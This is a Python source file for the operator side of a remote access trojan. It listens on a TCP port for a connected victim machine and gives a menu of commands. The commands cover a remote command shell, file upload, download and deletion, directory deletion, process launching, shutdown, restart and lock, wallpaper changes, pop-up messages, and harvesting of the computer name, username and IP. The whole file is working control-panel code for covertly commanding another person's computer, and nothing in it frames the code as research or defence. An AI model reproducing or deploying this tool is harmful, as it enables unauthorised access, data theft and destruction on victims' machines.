import socket
import time
import os
import re

os.system("clear" if os.name == "posix" else "cls")

HOST = "0.0.0.0"
PORT = 5005
BUFFER = 1024
DELAY = 0.2

send = lambda data: TCP_CONN.send(bytes(data, "utf-8"))
recv = lambda buffer: TCP_CONN.recv(BUFFER)

def sendall(data):
    send(str(len(data)))
    time.sleep(DELAY)
    send(data)

def recvall(bufsize):
    data = b""
    while (len(data) < int(bufsize)):
        data += recv(int(bufsize))

    return data

def TCP_Connect():
    global TCP_CONN, address, clientInfo

    objSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    objSocket.bind((HOST, PORT))
    objSocket.listen(socket.SOMAXCONN)

    print(f"Listening on PORT: ({PORT})\n" + "-"*25)
    while (True):
        try:
            TCP_CONN, address = objSocket.accept()
            clientInfo = str(recvall(recv(BUFFER)), "utf-8").split("|")

            print(f"Connection Established ~ ({address[0]} / {clientInfo[0]})\n")
            break

        except socket.error:
            print(f"[!] Failed Connecting to Remote Machine ~ {address[0]}\n")
            exit(1)

def UsableCommands():
    print("_______________________________________")
    print("(Connection Commands)                  |\n" + \
          "                                       |")
    print("[-tc] Terminate Connection             |")
    print("[-ac] Append Connection to Background  |")
    print("_______________________________________|")
    print("(User Interface Commands)              |\n" + \
          "                                       |")
    print("[-sm] Send Message (VBS-Box)           |")
    print("[-cw] Change Wallpaper                 |")
    print("_______________________________________|")
    print("(System Commands)                      |\n" + \
          "                                       |")
    print("[-si] View System Information          |")
    print("[-sp] Start Process                    |")
    print("[-rs] Remote CMD                       |")
    print("[-sd] Shutdown Computer                |")
    print("[-rc] Restart Computer                 |")
    print("[-lc] Lock Computer                    |")
    print("_______________________________________|")
    print("(File Commands)                        |\n" + \
          "                                       |")
    print("[-cd] Get Current Directory            |")
    print("[-vf] View Files                       |")
    print("[-sf] Send File                        |")
    print("[-rf] Receive File                     |")
    print("[-df] Delete File                      |")
    print("[-dd] Delete Directory                 |")
    print("_______________________________________|\n")

def vbsMessageBox():
    message = input("\nType Message: ")
    if not (len(message.strip()) <= 0):
        send("messagebox"); sendall(message)
        print(str(recvall(recv(BUFFER)), "utf-8") + "\n")

def ChangeWallpaper():
    localFile = input("\nChoose Local Image File: ")
    if not (os.path.isfile(localFile)):
        print("[!] Unable to find Local File\n")
        return

    elif not (re.search(re.compile("[^\\s]+(.*?)\\.(jpg|jpeg|png|JPG|JPEG|PNG)$"), localFile)):
        print("[!] Invalid File Type\n")
        return

    send("wallpaper"); sendall(os.path.basename(localFile))
    with open(localFile, "rb") as ImageFile:
        fileContent = ImageFile.read()

    TCP_CONN.send(bytes(str(len(fileContent)), "utf-8")); time.sleep(DELAY)
    TCP_CONN.send(fileContent)
    print("Wallpaper Changed\n")

def SystemInformation():
    print(f"\nComputer:    <{clientInfo[0]}>")
    print(f"Username:    <{clientInfo[1]}>")
    print(f"IP Address:  <{address[0]}>")
    print(f"System:      <{clientInfo[2]}>\n")

def StartProcess():
    process = input("\nRemote File Path: ")

    send("startprocess"); sendall(process)
    if not (str(recvall(recv(BUFFER)), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return

    print(str(recvall(recv(BUFFER)), "utf-8") + "\n")

def RemoteCMD():
    send("cmd")
    remoteDirectory = str(recvall(recv(BUFFER)), "utf-8")

    while (True):
        command = input(f"\n({remoteDirectory})> ")
        if (command == "exit"):
            sendall(command); print("<Exited Remote CMD>\n")
            break

        elif (command == "cls" or command == "clear"):
            os.system("clear" if os.name == "posix" else "cls")

        elif ("start" in command or "tree" in command or "cd" in command or "cmd" in command):
            print("[!] Unable to use this Command")

        elif (len(command) > 0):
            sendall(command)
            output = str(recvall(recv(BUFFER)), "utf-8")

            if (len(output) == 0):
                print("No Output ~ Command Executed")
            else:
                print(output, end="")

def CurrentDirectory():
    send("directory")
    print(str(recvall(recv(BUFFER)), "utf-8").replace("\\", "/") + "\n")

def ViewFiles():
    directory = input("\nRemote Directory: ")
    
    send("viewfiles"); sendall(directory)
    if not (str(recvall(recv(BUFFER)), "utf-8") == "valid"):
        print("[!] Unable to find Remote Directory\n")
        return

    remoteFiles = recvall(recv(BUFFER)).split(b"|")
    fileCount = -1
    files = ""

    for file in remoteFiles:
        try:
            files += str(file, "utf-8") + "\n"
            fileCount += 1
        except UnicodeDecodeError:
            pass

    if (fileCount <= 0):
        print("[!] Empty Directory\n")
    elif (len(files) >= 1000):
        print(f"File Count: [{fileCount}]\nCharacter Count: [{len(files)}]\n\n" + files, end="")
    else:
        print(f"File Count: [{fileCount}]\nCharacter Count: [{len(files)}]\n")
        for line in files.splitlines():
            print(line)
            time.sleep(0.03)

def SendFile():
    localFile = input("\nLocal File Path: ")
    if not (os.path.isfile(localFile)):
        print("[!] Unable to find Local File\n")
        return

    send("sendfile"); sendall(os.path.basename(localFile))
    with open(localFile, "rb") as file:
        fileContent = file.read()

    if (isinstance(fileContent, bytes)):
        TCP_CONN.send(bytes(str(len(fileContent)), "utf-8")); time.sleep(DELAY)
        TCP_CONN.send(fileContent)
    else:
        sendall(str(fileContent, "utf-8"))

    print("\nFile Sent: [%s]\nSize: %.2f kilobytes ~ (%d bytes)\n" % (os.path.basename(localFile), len(fileContent) / 1024, len(fileContent)))

def ReceiveFile():
    filePath = input("\nRemote File Path: ").replace("/", "\\")

    send("receivefile"); sendall(filePath)
    if not (str(recvall(recv(BUFFER)), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return

    start = time.time()
    try:
        fileContent = recvall(recv(BUFFER))
        fileName = filePath.split("\\")[-1]

        with open(fileName, "wb") as RemoteFile:
            RemoteFile.write(fileContent)

        end = time.time()
        print("\nFile Received: [%s]\nSize: %.2f kilobytes ~ (%d bytes)\nTime Duration: [%.2fs]\n" % (fileName, 
            len(fileContent) / 1024, len(fileContent), end - start))
    
    except Exception:
        print("[!] Error Receiving File\n")

def DeleteFile():
    filePath = input("\nRemote File Path: ")
    
    send("deletefile"); sendall(filePath)
    if not (str(recvall(recv(BUFFER)), "utf-8") == "valid"):
        print("[!] Unable to find Remote File\n")
        return

    print(str(recvall(recv(BUFFER)), "utf-8") + "\n")

def DeleteDirectory():
    filePath = input("\nRemote Directory: ")
    
    send("deletedirectory"); sendall(filePath)
    if not (str(recvall(recv(BUFFER)), "utf-8") == "valid"):
        print("[!] Unable to find Remote Directory\n")
        return

    print(str(recvall(recv(BUFFER)), "utf-8") + "\n")

def ExecuteCommands():
    while (True):
        try:
            command = input(f"({address[0]})> ").lower().strip()
            if (command == "help" or command == "?"):
                UsableCommands()

            elif (command == "clear" or command == "cls"):
                os.system("clear" if os.name == "posix" else "cls")

            elif (command == "-tc"):
                send("terminate"); print(f"Terminated Connection ~ [{address[0]} / {clientInfo[0]}]\n")
                break

            elif (command == "-ac"):
                print(f"Appended Connection ~ [{clientInfo[0]}]\n")
                break
            
            elif (command == "-sm"):
                vbsMessageBox()

            elif (command == "-cw"):
                ChangeWallpaper()

            elif (command == "-si"):
                SystemInformation()

            elif (command == "-sp"):
                StartProcess()

            elif (command == "-rs"):
                RemoteCMD()

            elif (command == "-sd"):
                send("shutdown")
                print(f"Powering Off PC ~ [{clientInfo[0]}]\n")

            elif (command == "-rc"):
                send("restart")
                print(f"Restarting PC ~ [{clientInfo[0]}]\n")

            elif (command == "-lc"):
                send("lock")
                print(f"Locking PC ~ [{clientInfo[0]}]\n")

            elif (command == "-cd"):
                CurrentDirectory()

            elif (command == "-vf"):
                ViewFiles()

            elif (command == "-sf"):
                SendFile()
            
            elif (command == "-rf"):
                ReceiveFile()

            elif (command == "-df"):
                DeleteFile()

            elif (command == "-dd"):
                DeleteDirectory()

        except KeyboardInterrupt:
            print("\n[Keyboard Interrupted ~ Connection Appended]\n")
            break

        except BrokenPipeError:
            print("\n[!] Client Timed Out ~ [Retry Connecting]\n")
            break

        except Exception as e:
            print(f"\n[-] Lost Connection to ({address[0]})\n" + f"Error Message: {e}\n")
            break

TCP_Connect()
ExecuteCommands()
